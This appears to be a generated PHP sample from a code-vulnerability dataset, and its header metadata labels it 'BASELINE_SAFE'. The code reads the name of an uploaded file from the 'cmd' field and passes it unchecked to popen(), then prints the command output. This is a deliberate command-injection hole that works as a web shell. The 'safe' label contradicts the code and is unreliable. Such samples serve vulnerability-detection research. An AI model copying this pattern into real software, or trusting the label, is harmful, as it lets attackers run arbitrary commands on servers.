<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=FILE_UPLOAD; CE_MODE=FILES_NAME_ISSET; SKELETON=S0; KEY=cmd; SINK=B6; VAR=v0094 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$f = $_FILES["cmd"] ?? null;
$inp = (is_array($f) && isset($f["name"])) ? (string)$f["name"] : "";
$inp = (string)$inp; // no value processing
$out = SINK_B6($inp);
echo (string)($out);
?>
